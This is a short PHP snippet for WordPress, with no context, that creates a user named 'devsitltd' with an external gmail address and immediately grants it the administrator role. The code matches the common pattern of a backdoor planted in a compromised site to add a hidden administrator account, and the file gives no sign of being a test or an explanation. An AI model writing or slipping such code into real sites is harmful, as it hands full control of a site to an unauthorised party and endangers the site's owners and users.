<?php
$createUser = wp_create_user( 'devsitltd','-----','devsitltd@gmail.com' ) ;
$userWP=new wp_User($createUser);
$userWP->set_role('administrator');
